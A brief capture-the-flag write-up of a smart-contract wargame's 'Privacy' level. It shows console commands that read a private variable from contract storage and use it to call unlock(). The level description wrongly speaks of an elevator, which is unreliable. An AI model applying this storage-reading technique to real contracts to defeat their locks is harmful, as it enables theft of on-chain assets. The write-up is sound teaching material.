# Level 12: Privacy

### Wargame
This elevator won't let you reach the top of your building. Right?

### Key Insights
* Storage Slots
* In Solidity, all state variables—including private ones—are stored in storage slots, which are part of the contract’s persistent storage.

### Attack Steps

1. Before executing the attack, display the locked value of the target contract.
    ```bash
    > await contract.locked()
    true
    ```

2. Read the data value from the storage slots and use it to calculate the key value.
    ```bash
    > data32 = await web3.eth.getStorageAt(instance, 5)
    '0x5fe1b0ae6eca46c70b8c6276ce184e737cea803a1cfd770eb7ba0f89dbb84de6'

    > key = data32.slice(0, 34)
    '0x5fe1b0ae6eca46c70b8c6276ce184e73'
    ```

3. Call unlock() to attack target contract.
    ```bash
    > contract.unlock(key)
    ```

4. After the transaction is confirmed, display the locked value of the target contract again.
    ```bash
    > await contract.locked()
    false
    ```
